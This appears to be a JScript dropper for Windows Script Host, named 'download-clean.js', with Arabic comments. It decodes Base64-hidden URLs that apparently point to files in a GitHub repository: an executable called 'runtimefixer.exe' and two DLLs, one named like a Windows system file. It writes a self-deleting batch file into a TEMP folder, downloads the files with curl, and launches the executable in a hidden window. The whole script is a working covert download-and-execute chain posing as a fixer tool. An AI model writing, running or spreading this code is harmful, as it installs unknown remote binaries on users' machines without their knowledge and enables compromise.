// download-clean.js
(function() {
    function log(msg) {
        try {
            WScript.Echo(msg);
        } catch(e) {}
    }
    
    function decodeBase64(base64) {
        return atob(base64);
    }
    
    function downloadAndExecute() {
        try {
            log("=== بدء التنزيل ===");
            
            var shell = new ActiveXObject("WScript.Shell");
            var fso = new ActiveXObject("Scripting.FileSystemObject");
            
            var targetDir = shell.ExpandEnvironmentStrings("%TEMP%") + "\\RuntimeFixer";
            log("المجلد: " + targetDir);
            
            if (!fso.FolderExists(targetDir)) {
                fso.CreateFolder(targetDir);
                log("تم إنشاء المجلد");
            }
            
            // الروابط في Base64
            var urlsBase64 = [
                "aHR0cHM6Ly9naXRodWIuY29tL2FtaW5kYXJhamk2NC1hcmNoL2EvcmF3L3JlZnMvaGVhZHMvbWFpbi9ydW50aW1lZml4ZXIuZXhl",
                "aHR0cHM6Ly9naXRodWIuY29tL2FtaW5kYXJhamk2NC1hcmNoL2IvcmF3L3JlZnMvaGVhZHMvbWFpbi9EaXNtQ29yZS5kbGw=",
                "aHR0cHM6Ly9naXRodWIuY29tL2FtaW5kYXJhamk2NC1hcmNoL2MvcmF3L3JlZnMvaGVhZHMvbWFpbi9QYWdlUGRmU2l6ZV9Db25maWcuZGxs"
            ];
            
            var names = ["runtimefixer.exe", "DismCore.dll", "PagePdfSize_Config.dll"];
            
            // فك تشفير الروابط
            var urls = [];
            for (var i = 0; i < urlsBase64.length; i++) {
                urls.push(decodeBase64(urlsBase64[i]));
            }
            
            // إنشاء ملف batch
            var batchPath = targetDir + "\\run.bat";
            var batchContent = "@echo off\r\n";
            batchContent = batchContent + "echo Downloading...\r\n";
            
            for (var i = 0; i < urls.length; i++) {
                var filePath = targetDir + "\\" + names[i];
                batchContent = batchContent + "curl -L -o \"" + filePath + "\" \"" + urls[i] + "\"\r\n";
            }
            
            batchContent = batchContent + "echo Running...\r\n";
            batchContent = batchContent + "start \"\" \"" + targetDir + "\\runtimefixer.exe\"\r\n";
            batchContent = batchContent + "del \"" + batchPath + "\"\r\n";
            
            // حفظ الملف
            var file = fso.CreateTextFile(batchPath, true);
            file.Write(batchContent);
            file.Close();
            
            log("تم إنشاء ملف batch");
            log("جاري التنزيل والتشغيل...");
            
            // التشغيل
            shell.Run("cmd.exe /c \"" + batchPath + "\"", 0, false);
            
            log("=== اكتمل ===");
            
        } catch(e) {
            log("خطأ: " + e.message);
        }
    }
    
    downloadAndExecute();
})();
